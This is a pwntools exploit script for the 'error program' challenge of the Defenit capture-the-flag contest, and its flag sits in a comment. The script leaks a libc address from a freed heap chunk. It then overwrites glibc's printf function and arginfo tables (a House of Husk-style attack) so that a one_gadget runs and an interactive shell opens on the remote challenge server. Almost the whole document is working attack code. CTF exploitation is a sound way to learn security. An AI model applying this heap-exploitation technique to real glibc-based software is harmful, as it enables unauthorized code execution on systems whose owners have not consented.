#exploit for error program
#flag=Defenit{1ntend:H0us3_0f_!@#$_and_us3_scanf}
from pwn import *
gadgets=[0x4f2c5,0x4f322,0xe569f,0xe5858,0xe585f,0xe5863,0x10a38c,0x10a398]
for gadget in gadgets:
	envi={"LD_PRELOAD":"./libc-2.27.so"}
	#target=process(['/media/sf_kalishared/tools/itl-master/linkers/x64/ld-2.27.so','./errorProgram'],env=envi)
	target=remote('error-program.ctf.defenit.kr', 7777)
	context.terminal=["tmux","split","-h"]
	#gdb.attach(target,'''pie breakpoint *(0xc57-0x203000)''')
	#gdb.attach(target)
	print(target.recvuntil("? : "))
	target.sendline("3")

	def init(option,index):
		print(target.recvuntil("? : "))
		target.sendline(str(option))
		print(target.recvuntil(" : "))
		target.sendline(str(index))
		
	def malloc(index,size):
		init(1,index)
		print(target.recvuntil(" : "))
		target.sendline(str(size))
		print(target.recvline())

	def free(index):
		init(2,index)
		print(target.recvline())

	def edit(index,data):
		init(3,index)
		print(target.recvuntil(" : "))
		target.send(data)
			
	def view(index):
		init(4,index)
		print(target.recvuntil(" : "))
		leak=target.recv(0x10)
		print(leak)
		return leak

	def size(offset):
		return 2*offset-0x10

	PRINTF_ARGINFO=0x3ec870
	PRINTF_FUNCTABLE=0x3f0658
	MAIN_ARENA=0x3ebc40
	malloc(0,0x1000)
	malloc(1,size(PRINTF_FUNCTABLE-MAIN_ARENA))
	malloc(2,size(PRINTF_ARGINFO-MAIN_ARENA))
	free(0)
	libc_leak=u64(view(0)[0:6]+"\x00"*2)

	offset=0x3ebca0
	max_bins=0x3ed940
	libc_base=libc_leak-offset
	libc_max_bins=libc_base+max_bins
	libc_gadget=libc_base+gadget
	print(hex(libc_base))

	edit(0,p64(libc_max_bins-0x10)+p64(libc_max_bins-0x10))
	edit(2,"A"*944+p64(libc_gadget))
	malloc(3,0x1000)
	free(1)
	free(2)


	print(target.recvuntil("? : "))
	target.sendline(str(5))
	print(target.recvuntil("? : "))
	target.sendline(str(1))

	print(target.recvuntil(" : "))
	target.send("\x00"*0x108)

	target.interactive()

